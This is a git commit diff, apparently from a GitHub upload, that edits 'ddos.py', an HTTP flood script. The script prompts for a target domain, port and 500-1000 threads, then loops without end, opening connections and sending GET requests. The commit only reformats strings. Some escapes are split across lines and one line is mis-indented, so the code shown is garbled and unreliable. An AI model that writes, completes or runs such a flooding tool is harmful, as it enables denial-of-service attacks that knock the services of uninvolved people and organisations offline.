a8b7cb0944ea3e008fa0ff8b5eebd6d3c22ca71d
chrstianjames <113699127+chrstianjames@users.noreply.github.com>
2025-03-20 00:58:02 +0800

    Add files via upload

--- ddos.py
+++ ddos.py
@@ -9,17 +9,18 @@ target_port = int(input("Enter target port: "))
 
 attack_threads = int(input("Enter number of attack threads (500-1000 recommended): "))
 
-print(f"
-Attacking {target_domain}:{target_port} with {attack_threads} threads...")
+print(f"Attacking {target_domain}:{target_port} with {attack_threads} threads...")
 
 def attack():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_domain, target_port))
-            s.send(b"GET / HTTP/1.1\r
-Host: "+bytes(target_domain, 'utf-8')+b"\r
-\r
+s.send(b"GET / HTTP/1.1\r
+"
+      b"Host: "+bytes(target_domain, 'utf-8')+b"\r
+"
+      b"\r
 ")
             s.close()
         except socket.error:
@@ -34,3 +35,4 @@ for i in range(attack_threads):
 while True:
     elapsed_time = time.time() - start_time
     print(f"\rAttack elapsed time: {elapsed_time:.2f} seconds", end="")
+   
